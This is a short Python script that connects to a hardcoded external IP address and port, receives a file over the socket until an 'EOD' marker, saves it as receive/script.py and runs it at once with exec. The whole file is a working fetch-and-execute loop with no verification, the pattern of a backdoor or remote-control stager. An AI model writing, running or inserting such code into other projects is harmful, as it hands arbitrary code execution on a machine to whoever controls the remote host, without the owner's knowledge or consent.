import socket
from pathlib import Path
import os

s = socket.socket() # new socket object
host = "35.239.126.169"
# host = socket.gethostname()
port = 377
s.connect((host,port))

print("established connection to server on", host, port)

while True: # listen for new file data
    l = s.recv(1024)
    if (l): # begin receipt of file
        print("receiving file")
        data = bytearray()
        while True: # receive file data into memory
            data += l
            if data[-3:] == b"EOD": # if end of data
                data = data[:-3]
                break
            else: # not end of data, continue reading as normal
                l = s.recv(1024)
        f = open('receive/script.py','wb')
        f.write(data)
        f.close()
        print("file transfer complete, executing script")
        exec(open("./receive/script.py").read())